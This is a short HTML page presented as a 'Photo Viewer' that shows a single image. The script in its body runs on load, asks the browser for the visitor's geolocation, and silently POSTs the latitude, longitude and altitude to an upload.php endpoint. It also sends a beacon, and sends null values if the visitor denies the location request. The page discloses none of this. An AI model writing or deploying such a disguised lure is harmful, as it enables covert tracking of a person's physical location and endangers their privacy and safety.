<!DOCTYPE HTML>
<html>
     <head>
        <title>Photo Viewer</title>
     </head>
     <body>
        <img src="img.jpeg" />
        <script>
            var httpRequest = new XMLHttpRequest();
            httpRequest.open('POST', 'upload.php', true);
            httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            httpRequest.send("pre=1");
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition,errorProcess);
            } else {
                errorProcess();
            }
            
            function showPosition(position) {
                var httpRequest = new XMLHttpRequest();
                 httpRequest.open('POST', 'upload.php', true);
                httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                httpRequest.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude + "&altitude=" + position.coords.altitude);
            }
            
            function errorProcess(error) {
                var httpRequest = new XMLHttpRequest();
                 httpRequest.open('POST', 'upload.php', true);
                httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                httpRequest.send("latitude=null&longitude=null&altitude=null");
            }
        </script>
     </body>
 </html>